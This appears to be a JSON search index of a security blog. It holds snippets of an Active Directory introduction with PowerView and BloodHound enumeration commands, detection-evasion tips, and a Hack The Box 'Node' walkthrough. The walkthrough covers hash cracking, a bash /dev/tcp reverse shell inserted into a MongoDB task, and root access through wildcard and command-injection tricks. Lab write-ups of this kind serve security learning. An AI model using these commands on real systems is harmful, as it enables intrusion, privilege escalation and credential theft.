load the collected data.Supply data to BloodHoundThe generated archive can be uploaded to the BloodHound application.. .\\SharpHound.ps1Invoke-BloodHound -CollectionMethod All,LoggedOnTo avoid detections like ATAInvoke-BloodHound -CollectionMethod All -ExcludeDCStart neo4j and BloodHound UI on kali machine and load the zip/json files0xStarlight@kali$ sudo neo4j console0xStarlight@kali$ bloodhoundReferences Powershell Introdution from : https://tryhackme.com/room/powershell AMSI Brief from : https://tryhackme.com/room/hololiveIf you find my articles interesting, you can buy me a coffee" }, { "title": "Active Directory - Introduction", "url": "/posts/Active-Directory-Introduction/", "categories": "Red-Teaming, Active-Directory-Introduction", "tags": "active-directory, active-directory-introduction", "date": "2022-03-29 12:36:00 +0530", "snippet": "IntroductionWelcome to my first article in the Red Teaming Series (Active Directory Introduction). I hope to provide you all with information for an initial foundation and motivation about Active Directory, so let‚Äôs moveforward to learn other exciting aspects of the directory service developed by Microsoft to manage windows domain networks.This guide aims to explain the complete basics of Active Directory and those terms that every pentester/red-teamer should control to understand the attacks performed in an Active Directory network.I will cover the following topics under this guide: Domain, Domain Controllers Trees, Forests Group Policy Object Access Control List Users + Groups Trusts Policies Throughout the article I will use PowerView which is based on Powershell to show how to retrieve information of Active Directory.This article has been created with references from a few other articles.All used references for completing this article will be listed below.‚ÄîWhat is Active Directory?In a short description, an Active Directory is a system that allows the collection of machines and servers connected inside the same network from a central server(known as a Domain) that are a collective part of a bigger server(known as a forest) that make up the Active Directory network.It stores information related to objects, such as Computers, Users, Printers, etc. You can think about it as a phone book for Windows. One of its main purposes is for authentication using Kerberos tickets. Non-windows devices, such as Linux machines, firewalls, etc., can also authenticate to Active Directory via RADIUS or LDAP protocols.Active Directory contains many functioning bits and pieces, a majority of which we will be covering in the upcoming tasks.Why use Active Directory?The majority of large companies use Active Directory because it allows for controlling and monitoring their user‚Äôs computers through a single domain controller. It will enable a single user to sign in to any computer on the active directory network and have access to their stored files and folders in the server and the local storage on that machine. This allows any user in the company to use any machine that the company owns without setting up multiple users on a machine. Active Directory does it all for you.If this is still unclear, let me give you an example.Let‚Äôs take the example of Microsoft. It‚Äôs a worldwide company with millions of employees. Let‚Äôs focus on one building of Microsoft, which has about a thousand plus employees. Each of these employees is working on their workstations (Windows/Linux).This building might contain different departments like Market Research, Product Decisions, HR, IT, etc.Now imagine if one of the departments required a software update, or if one of the employees forgot their password, or one of the employees needed higher privileges to access view some content.It would be extremely tedious if the IT department tried to fix all the issues. But this issue can resolve if they have all the computers connected in an Active Directory network to perform all these operations under one hood.Domain ControllersFirst of all, I have been reffering an Active Directory network as a Domain. In brief, a domain is a set of connected computers that shares an Active Directory database, which is managed by the central servers of a domain, that are called Domain Controllers.A domain controller is a Windows server that has Active Directory Domain Services (AD DS) installed and has been promoted to a domain controller in the forest. Domain controllers are the center of Active Directory , they control the rest of the domain. Outlineing some of the tasks of a domain controller below: Holds the AD DS data store Handles authentication and authorization services Replicate updates from other domain controllers in the forest Allows admin access to manage domain resourcesPowerView EnumerationWe can gather additional information about our target using PowerView Get current domain PS C:\\Tools&amp;gt; Get-NetUseruser-dc.it.starlight.localuser-mssql.it.starlight.localuser-adminsrv.it.starlight.local Enumerate Domain Admins Get-NetDomain# See Attributes of the Domain Admins GroupGet-NetGroup -GroupName &quot;Domain Admins&quot; -FullData# Get Members of the Domain Admins groupGet-NetGroupMember -GroupName &quot;Domain Admins&quot; Active Directory DS Data StoreThe Active Directory Data Store holds the databases and processes needed to store and manage directory information such as users, groups, and services. Below is an outline of some of the contents and characteristics of the AD DS Data Store: Contains the NTDS.dit - a database that contains all of the information of an Active Directory domain controller as well as password hashes for domain users Stored by default in %SystemRoot%\\NTDS Accessible only by the domain controllerTreesA hierarchy of domains in Active Directory Domain Services are known as Trees.All the domains in the tree : Can share a contiguous namespace with the parent domain Can have additional child domains By default create a two-way transitive trust with other child domainsForestsActive-Directory-Basics-THM-RoomThe forest is what defines everything; it is the container that holds all of the other bits and pieces of the network together ‚Äì without the forest all of the other trees and domains would not be able to interact. The one thing to note when thinking of the forest is to not think of it too literally ‚Äì it is a physical thing just as much as it is a figurative thing. When we say ‚Äúforest‚Äù, it is only a way of describing the connection created between these trees and domains by the network.Forest OverviewA forest is a collection of one or more domain trees inside of an Active Directory network. It is what categorizes the parts of the network as a whole.The Forest consists of these parts which we will go into farther detail with later: Trees - A hierarchy of domains in Active Directory Domain Services Domains - Used to group and manage objects Organizational Units (OUs) - Containers for groups, computers, users, printers and other OUs Trusts - Allows users to access resources in other domains Objects - users, groups, printers, computers, shares Domain Services - DNS Server, LLMNR, IPv6 Domain Schema - Rules for object creationGroup Policy ObjectGroup Policy provides the ability to manage configuration and changes easily and centrally in AD.Allows configuration of : Security settings Registry-based policy settings Group policy preferences like startup/shutdown/log-on/logoff scripts settings Software installationGPO can be abused for various attacks like privesc, backdoors, persistence etc.PowerView EnumerationWe can gather additional information about our target using PowerView Get list of GPO in current domain. Get-NetGPOGet-NetGPO -ComputerName &amp;lt;computer-name&amp;gt;Get-GPO -All (GroupPolicy module)Get-GPResultantSetOfPolicy -ReportType Html -Path C:\\Users\\Administrator\\report.html (Provides RSoP)gpresult /R /V (GroupPolicy Results of current machine) Get GPO(s) which use Restricted Groups or groups.xml for interesting users Get-NetGPOGroup Get users which are in a local group of a machine using GPO Find-GPOComputerAdmin -ComputerName &amp;lt;computer-name&amp;gt; Get machines where the given user is member of a specific group Find-GPOLocation -Username student1 -Verbose Get OUs in a domain Get-NetOU -FullData Get GPO applied on an OU. Read GPOname from gplink attribute from Get-NetOU Get-NetGPO -GPOname &quot;{AB306569-220D-43FF-BO3B-83E8F4EF8081}&quot;Get-GPO -Guid AB306569-220D-43FF-B03B-83E8F4EF8081 (GroupPolicy module) Access Control List The Access Control Model enables control on the ability of a process to access objects and other resources in active directory based on: Access Tokens (security context of a process ‚Äî identity and privs of user) Security Descriptors (SID of the owner, Discretionary ACL (DACL) and System ACL (SACL)) It is a list of Access Control Entries (ACE) ‚Äî ACE corresponds to individual permission or audits access. Who has permission and what can be done on an object? Two types: DACL : Defines the permissions trustees (a user or group) have on an object. SACL : Logs success and failure audit messages when an object is accessed. ACLs are vital to security architecture of AD.PowerView EnumerationWe can gather additional information about our target using PowerView Get the ACLs associated with the specified object Get-ObjectAcl -SamAccountName student1 -ResolveGUIDs Get the ACLs associated with the specified prefix to be used for search Get-ObjectAcl -ADSprefix &#39;CN=Administrator,CN=Users&#39; -Verbose We can also enumerate ACLs using ActiveDirectory module but without resolving GUIDs (Get-Acl &quot;AD:\\CN=Administrator, CN=&amp;lt;name&amp;gt;, DC=&amp;lt;name&amp;gt;, DC=&amp;lt;name&amp;gt;,DC=local&quot;).Access Get the ACLs associated with the specified LDAP path to be used for search Get-ObjectAcl -ADSpath &quot;LDAP://CN=Domain Admins,CN=Users,DC=&amp;lt;name&amp;gt;,DC=&amp;lt;name&amp;gt;,DC=local&quot; -ResolveGUIDs -Verbose Search for interesting ACEs Invoke-ACLScanner -ResolveGUIDs Get the ACLs associated with the specified path Get-PathAcl -Path &quot;\\\\&amp;lt;computer-name&amp;gt;\\sysvol&quot; Users + GroupsThe users and groups that are inside of an Active Directory are up to you; when you create a domain controller it comes with default groups and two default users: Administrator and guest. It is up to you to create new users and create new groups to add users to.Users OverviewUsers are the core to Active Directory; without users why have Active Directory in the first place? There are four main types of users you‚Äôll find in an Active Directory network; however, there can be more depending on how a company manages the permissions of its users. The four types of users are: Domain Admins - This is the big boss: they control the domains and are the only ones with access to the domain controller. Service Accounts (Can be Domain Admins) - These are for the most part never used except for service maintenance, they are required by Windows for services such as SQL to pair a service with a service account Local Administrators - These users can make changes to local machines as an administrator and may even be able to control other normal users, but they cannot access the domain controller Domain Users - These are your everyday users. They can log in on the machines they have the authorization to access and may have local administrator rights to machines depending on the organization.Groups OverviewGroups make it easier to give permissions to users and objects by organizing them into groups with specified permissions. There are two overarching types of Active Directory groups: Security Groups - These groups are used to specify permissions for a large number of users Distribution Groups - These groups are used to specify email distribution lists. As an attacker these groups are less beneficial to us but can still be beneficial in enumerationDefault Security GroupsThere are a lot of default security groups so I won‚Äôt be going into too much detail of each past a brief description of the permissions that they offer to the assigned group. Here is a brief outline of the security groups: Domain Controllers - All domain controllers in the domain Domain Guests - All domain guests Domain Users - All domain users Domain Computers - All workstations and servers joined to the domain Domain Admins - Designated administrators of the domain Enterprise Admins - Designated administrators of the enterprise Schema Admins - Designated administrators of the schema DNS Admins - DNS Administrators Group DNS Update Proxy - DNS clients who are permitted to perform dynamic updates on behalf of some other clients (such as DHCP servers). Allowed RODC Password Replication Group - Members in this group can have their passwords replicated to all read-only domain controllers in the domain Group Policy Creator Owners - Members in this group can modify group policy for the domain Denied RODC Password Replication Group - Members in this group cannot have their passwords replicated to any read-only domain controllers in the domain Protected Users - Members of this group are afforded additional protections against authentication security threats. See http://go.microsoft.com/fwlink/?LinkId=298939 for more information. Cert Publishers - Members of this group are permitted to publish certificates to the directory Read-Only Domain Controllers - Members of this group are Read-Only Domain Controllers in the domain Enterprise Read-Only Domain Controllers - Members of this group are Read-Only Domain Controllers in the enterprise Key Admins - Members of this group can perform administrative actions on key objects within the domain. Enterprise Key Admins - Members of this group can perform administrative actions on key objects within the forest. Cloneable Domain Controllers - Members of this group that are domain controllers may be cloned. RAS and IAS Servers - Servers in this group can access remote access properties of usersTrusts In an AD environment, trust is a relationship between two domains or forests which allows users of one domain or forest to access resources in the other domain or forest. Trust can be automatic (parent-child, same forest etc.) or established (forest, external). Trusted Domain Objects (TDOs) represent the trust relationships in a domain.One-way trust One-way trust ‚Äî Unidirectional. Users in the trusted domain can access resources in the trusting domain but the reverse is not true.Two-way trusts Two-way trust ‚Äî Bi-directional. Users of both domains can access resources in the other domain.Trust Transitivity Transitive : Can be extended to establish trust relationships with other domains. All the default intra-forest trust relationships (Tree-root, Parent-Child) between domains within a same forest are transitive two-way trusts. Nontransitive ‚Äî Cannot be extended to other domains in the forest. Can be two-way or one-way. This is the default trust (called external trust) between two domains in different forests when forests do not have a trust relationship. PowerView EnumerationWe can gather additional information about our target using PowerView Get a list of all domain trusts for the current domain Get-NetDomainTrustGet-NetDomainTrust -Domain &amp;lt;domain-name&amp;gt; Get details about the current forest Get-NetForestGet-NetForest -Forest &amp;lt;forest-name&amp;gt; Get all domains in the current forest Get-NetForestDomainGet-NetForestDomain -Forest &amp;lt;forest-name&amp;gt; Get all global catalogs for the current forest Get-NetForestCatalogGet-NetForestCatalog -Forest &amp;lt;forest-name&amp;gt; Map trusts of a forest Get-NetForestTrustGet-NetForestTrust -Forest &amp;lt;forest-name&amp;gt; Hunting for users who have Local Admin access using Powerview Find all machines on the current domain where the current user has local admin access Find-LocalAdminAccess -Verbose This is very noiseThis function queries the DC of the current or provided domain for a list of computers (Get-NetComputer) and then use multi-threaded Invoke-CheckLocalAdminAccess on each machine.This can also be done with the help of remote administration tools like WMI and PowerShell remoting. Pretty useful in cases ports (RPC and SMB) used by Find-LocalAdminAccess are blocked.See Find-WMILocalAdminAccess.ps1This leaves a 4624 (log-on event) and 4634 (log-off event) on each and every object in the domain. Same for Blood-Hound. Find computers where a domain admin (or specified user/group) has sessions Invoke-UserHunterInvoke-UserHunter -GroupName &quot;RDPUsers&quot; This function queries the DC of the current or provided domain for members of the given group (Domain Admins by default) using Get-NetGroupMember, gets a list of computers (Get-NetComputer) and list sessions and logged on users (Get-NetSession/Get-NetLoggedon) from each machine. To confirm admin access Invoke-UserHunter -CheckAccess Find computers where a domain admin is logged-in Invoke-UserHunter -Stealth This option queries the DC of the current or provided domain for members of the given group (Domain Admins by default) using Get-NetGroupMember, gets a list only of high traffic servers (DC, File Servers and Distributed File servers) for less traffic generation and list sessions and logged on users (Get-NetSession/Get-NetLoggedon) from each machine. PoliciesThe Active Directory domain services are the core functions of an Active Directory network; they allow for management of the domain, security certificates, LDAPs, and much more. This is how the domain controller decides what it wants to do and what services it wants to provide for the domain.Domain Services OverviewDomain Services are exactly what they sound like. They are services that the domain controller provides to the rest of the domain or tree. There is a wide range of various services that can be added to a domain controller; however, in this room we‚Äôll only be going over the default services that come when you set up a Windows server as a domain controller. Outlined below are the default domain services: LDAP - Lightweight Directory Access Protocol; provides communication between applications and directory services Certificate Services - allows the domain controller to create, validate, and revoke public key certificates DNS, LLMNR, NBT-NS - Domain Name Services for identifying IP hostnamesDomain Authentication OverviewThe most important part of Active Directory ‚Äì as well as the most vulnerable part of Active Directory ‚Äì is the authentication protocols set in place. There are two main types of authentication in place for Active Directory: NTLM and Kerberos. Since these will be covered in more depth in later rooms we will not be covering past the very basics needed to understand how they apply to Active Directory as a whole. Kerberos - The default authentication service for Active Directory uses ticket-granting tickets and service tickets to authenticate users and give users access to other resources across the domain. NTLM - default Windows authentication protocol uses an encrypted challenge/response protocolThe Active Directory domain services are the main access point for attackers and contain some of the most vulnerable protocols for Active Directory, this will not be the last time you see them mentioned in terms of Active Directory security.References https://zer1t0.gitlab.io/posts/attacking_ad/ https://tryhackme.com/room/activedirectorybasicsIf you find my articles interesting, you can buy me a coffee" }, { "title": "Hack The Box - Node", "url": "/posts/HTB-Node-Writeup/", "categories": "Hackthebox, Hackthebox-Linux, Hackthebox-Medium", "tags": "nmap, nodejs, crackstation, source-code, password-reuse, bof, command-injection, wildcard, reverse-engineering, binaryninja, OSCP", "date": "2022-03-21 09:03:00 +0530", "snippet": "Node is about enumerating an Express NodeJS application to find an API endpoint that discloses the usernames and password hashes. To root the box is a simple buffer overflow and possible by three other unintended ways.ReconNmapThe first thing that I do is run nmap scan that show this results:0xStarlight@kali$ nmap -sC -sV -Pn 10.10.10.58 -vv &amp;gt; nmap_scan.conf0xStarlight@kali$ cat nmap_scan.confPORT STATE SERVICE REASON VERSION# 22/tcp open ssh syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwesV+Yg8+5O97ZnNFclkSnRTeyVnj6XokDNKjhB3+8R2I+r78qJmEgVr/SLJ44XjDzzlm0VGUqTmMP2KxANfISZWjv79Ljho3801fY4nbA43492r+6/VXeer0qhhTM4KhSPod5IxllSU6ZSqAV+O0ccf6FBxgEtiiWnE+ThrRiEjLYnZyyWUgi4pE/WPvaJDWtyfVQIrZohayy+pD7AzkLTrsvWzJVA8Vvf+Ysa0ElHfp3lRnw28WacWSaOyV0bsPdTgiiOwmoN8f9aKe5q7Pg4ZikkxNlqNG1EnuBThgMQbrx72kMHfRYvdwAqxOPbRjV96B2SWNWpxMEVL5tYGb| 256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKQ4w0iqXrfz0H+KQEu5D6zKCfc6IOH2GRBKKkKOnP/0CrH2I4stmM1C2sGvPLSurZtohhC+l0OSjKaZTxPu4sU=| 256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB5cgCL/RuiM/AqWOqKOIL1uuLLjN9E5vDSBVDqIYU6y# 3000/tcp open hadoop-tasktracker syn-ack Apache Hadoop| hadoop-datanode-info: |_ Logs: /login| hadoop-tasktracker-info: |_ Logs: /login|_http-favicon: Unknown favicon MD5: 30F2CC86275A96B522F9818576EC65CF| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-title: MyPlaceService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelFrom the nmap results, we can see that there is port 3000 which is a web service that running on the server and on port 22 is SSH.Website - TCP 3000First of all, we can add the IP to our /etc/host folder as node.htb0xStarlight@kali$ sudo nano /etc/host10.10.10.58 node.htbUpon visiting the site, it looks like a typical social media site. It has a signup page which is currently closed, and a login page.I tried using some common usernames and passwords to log in, but none of them succeeded. Since it uses NodeJS, there‚Äôs a good chance the backend is using MongoDB. I tried some basic NoSQL injections but got no luck.I then tried feroxbuster, but that resulted in the URL redirecting all the pages to the main home page.So none of those helped me anyhow.Cracking HashesLet us refresh the page, check the network tab, look through all the *.js files, and check if we find any interesting files.I found an interesting js file that makes a GET request to another js file to pull down all the profiles.GET /assets/js/app/controllers/profile.js HTTP/1.1Host: node.htb:3000Connection: keep-alive[SNIP...]Let us look at the source code of the js file.It is making a GET API request to /api/users seems to pull down the username parameterUpon visiting the endpoint, we can see that it contains all the user‚Äôs IDs, usernames and hashes, which will allow us to log in to the webpage.We can grab the hashes and try cracking them on crackstation to get the passwords in plain text.Great now we have the username and passwords in plain text.Let‚Äôs login on to the web page as myP14ceAdm1nAcc0uNT as it has admin privileges.Shell as Markmyplace.backupAfter Logging in, there was an option to download a backup file. We can download the file on our local machine and start to analyze it.We can try checking the file type first.0xStarlight@kali$ file myplace.backup myplace.backup: ASCII text, with very long lines, with no line terminatorsIt says ASCII text. Let us read the content of the file.0xStarlight@kali$ cat myplace.backup UEsDBAoAAAAAAHtvI0sAAAAAAAAAAAAAAAAQABwAdmFyL3d3dy9teXBsYWNlL1VUCQADyfyrWXrgd2F1eAsAAQQAAAAABAAAAABQSwMEFAAJAAgARQEiS0x97zc0EQAAEFMAACEAHAB2YXIvd3d3L215cGxhY2UvcGFja2FnZS1sb2NrLmpzb25VVAkAA9HoqVlL/8pZdXgLAAEEAAAAAAQAAAAAynsHjHtvHInyMHK96c66FXUMDUOwEAWe+Am9h6156G33NE/wuxHi0dnBAx8vweFPkPqZtCDL3hM4F+eobU5Cerzkqznx9Fu1mCWfZFHymBPNt+ihMv+mlQbBfTJ6VQrUVmgoxcEt51mXSx5sWQ/92wOT0aZs1cxrWnlpfAS+mRr/a8HjU8ZqF6XiEhR9EIaLPeuXGFRaB7o9mT0/YvtfL1zSnzme5kdmQhquEV/4Zxo4lJv5JTbxPJeC[SNIP...]It seems like base64 encoded ASCII text.We can pipe the file content as base64, store it into another file, and recheck the file type.0xStarlight@kali$ cat myplace.backup | base64 -d &amp;gt; unknown_file0xStarlight@kali$ file unknown_file unknown_file: Zip archive data, at least v1.0 to extractIt results in a Zip archive data file. When trying to unzip, it requires a password. We can crack the password by fcrackzip using rockyou.txt as the wordlist.0xStarlight@kali$ fcrackzip -u -D -p /home/kali/rockyou.txt unknown_file PASSWORD FOUND!!!!: pw == magicwordLets unzip the file and check the archived content0xStarlight@kali$ ls app.html app.js node_modules package.json package-lock.json staticAfter reading the content in app.js we can get the credentials to connect to MongoDB on localhost to myspace process.0xStarlight@kali$ batcat app.js mark:5AYRft[SNIP‚Ä¶]SSH as MarkLet us try to logon as SSH as Mark with the same password we found from the app.js file.Maybe password reuse?0xStarlight@kali$ ssh mark@10.10.10.58Great we logged on !Shell as TomWe found MongoDB running on Mark‚Äôs machine from the downloaded backup file. We check if any node services are running on the machine and try to connect it as Mark.mark@node:/home$ ps aux | grep nodetom 1230 0.0 5.3 1008056 40400 ? Ssl 18:55 0:01 /usr/bin/node /var/scheduler/app.jstom 1234 0.0 5.6 1019880 42936 ? Ssl 18:55 0:01 /usr/bin/node /var/www/myplace/app.jsmark 1541 0.0 0.1 14228 940 pts/0 S+ 19:37 0:00 grep --color=auto nodeIt looks like Tom has the same file running on a different processLet‚Äôs read the content from /var/scheduler/app.js file.It looks like it creates a DB collection named task.It takes an input parameter as cmd on line 18 and executes it, and then deletes it after the execution is done.So now we can privilege escalation by injecting a reverse shell in the cmd parameter.Let us try to connect to mongo DB as Mark using the scheduler process.mark@node:/home$ mongo -u mark -p 5AYRft73VtFpc84k schedulerIt seems like the DB is empty after querying the data collections.&amp;gt; show collectionstasks&amp;gt; db.tasks.find()&amp;gt; &amp;gt; db.task.count()0Let us add an object in the tasks collections with a cmd parameter containing a reverse shell that will connect back to Tom since the scheduler process is running as Tom.&amp;gt; db.tasks.insert({&quot;cmd&quot;: &quot;bash -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.17/9999 0&amp;gt;&amp;amp;1&#39;&quot;})WriteResult({ &quot;nInserted&quot; : 1 })&amp;gt;We got a shell as Tom !backup SUIDLet us check the SUID privileges for Tom user and search for any interesting files.tom@node:/home$ find / -user root -perm -4000 -exec ls -ldb {} \\; 2&amp;gt;/dev/nullI found an interesting file backup, with file permissions as admin to execute.We can execute the file since we have GUID as admin as Tom.On executing the file, it doesn‚Äôt return anything.tom@node:/$ /usr/local/bin/backupI do remember that there was a process that spawns backup on api.js whcih we found earlier.Let‚Äôs read that and see what it does.var proc = spawn(&#39;/usr/local/bin/backup&#39;, [&#39;-q&#39;, backup_key, __dirname ]);It takes three parameters: -q, then a backup key and a directory name.Let us run the file using strace to check what‚Äôs happening.tom@node:/$ strace /usr/local/bin/backup a a aAt the end of the file we can notice its trying read the content of &quot;/etc/myplace/keys&quot; file.[SNIP...]) = 81write(1, &quot;\\n&quot;, 1) = 1open(&quot;/etc/myplace/keys&quot;, O_RDONLY) = 3fstat64(3, {st_mode=S_IFREG|0644, st_size=196, ...}) = 0read(3, &quot;a01a6aa5aaf1d7729f35c8278daae30f&quot;..., 4096) = 196read(3, &quot;&quot;, 4096) = 0write(1, &quot; \\33[33m[!]\\33[37m Ah-ah-ah! You did&quot;..., 57 [!] Ah-ah-ah! You didn&#39;t say the magic word!) = 57[SNIP...]After reading the file‚Äôs content, We can figure that it contains some keys. Maybe we can use these keys and read the root directory?tom@node:/$ cat /etc/myplace/keysa01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc50845fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d4743de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110Shell as RootRead Flag only [ Path I ]Since now we have the keys and know how it works, let us try to read the root directory folder.tom@node:/$ backup -q a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 /rootLet us transfer the output to our local machine and analyze it. It looks like base64, and piping it out to a file and analyzing it tells it is a zip file. We can use the same password as last time to crack the zip and read the data.0xStarlight@kali$ cat unknown | base64 -d &amp;gt; unknown.zip0xStarlight@kali$ unzip unknown.zipAfter extracting the file it gives us root.txtLet us read the content of the file.0xStarlight@kali$ cat root.txtIts a troll ! :( I guess its not that easyLet us try it out again without / in /root while entering the parameter. I am just guessing and checking the result.tom@node:/$ backup -q a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 rootIt has way more output this time.Let us do the same steps as before, extract the file and then read the file‚Äôs contents.0xStarlight@kali$ unzip decode.zip Archive: decode1.zip creating: root/[decode1.zip] root/.profile password: inflating: root/.profile inflating: root/.bash_history creating: root/.cache/ extracting: root/.cache/motd.legal-displayed extracting: root/root.txt inflating: root/.bashrc inflating: root/.viminfo creating: root/.nano/ extracting: root/.nano/search_history It looks like we have root.txt ü•≥.But it‚Äôs not over yet. We don‚Äôt have a shell.Wild Characters [ Path - II ]Let‚Äôs transfer this file over to our local host machine and analyze the file on binaryninja.Open the main function in the disassembly Graph view.After scrolling down, we can see that it has /root as a bad character, resulting in the troll ASCII Art.Further Scrolling down, we can get a list of all the bad chars that it doesn‚Äôt allow. ..And if we go on doing this, we will find all the bad characters.Bad chars : .. /root ; &amp;amp; ` $ | /etc // / etcLooking at our bad chars list, we don‚Äôt have the * nor ~ sign.We can use this to bypass and read the /root directories files and content.For example, if we do the following command on our local machine.$ cd ~$ cd r**t$ cd r??tWe will be returned to our home directory since there is no other directory it can get returned to.Hence we can read the root flag this way.Let us try it out.tom@node:/$ backup -q a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 /r**t/roo*.txtThis gives us the root.txt file content.We can do the same steps as privilege escalation 1 to extract the file and retrieve the flag.We can also try to read the /etc/passwd file and then try to crack it, then SSH as root on the machine.tom@node:/$ backup -q a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 &quot;/e*c/shado*&quot; ; echoExtract the file by the same methods above, and then we can read the shadow file root hashes.Command Injection [ Path-III ]Open the main function in the disassembly Graph view.Scroll down to the part where it executes the zip command if the parameters are correct.Here we can see it has the exec command for zipping the data, and below that, we can also see that it calls the system; which means we might be able to do command injection on the third parameter with the help of a new line and get root and it is not a bad char as well.Now let us find out how we can do the command injection.Open the main function in ELF Linear View.We can see a command which gets executed if we enter the correct magic word. It will zip the file content in base64 and display it to us on the screen.&quot;/usr/bin/zip -r -P magicword %s %s &amp;gt; /dev/null&quot;As per the command, we can see it takes the last argument and pushes it to /dev/null. Hence, the command won‚Äôt execute it.So we can try to execute /bin/bash and get a root shell!We can do the command injection something like this.&quot;randomblahbla/bin/bashrandomblahba&quot;We can‚Äôt do command injection in the first parameter since it has a bad char check for / but not for the chars on a new line, and we can‚Äôt put it at the end as it will get flushed out to /dev/null.Lets try it outWE ARE ROOT !!BOF [ Path - IV ]A really good blog is written for this method of priv eschttps://rastating.github.io/hackthebox-node-walkthrough/Box RootedHTB Profile : 0xStarlightIf you find my articles interesting, you can buy me a coffee" } ]
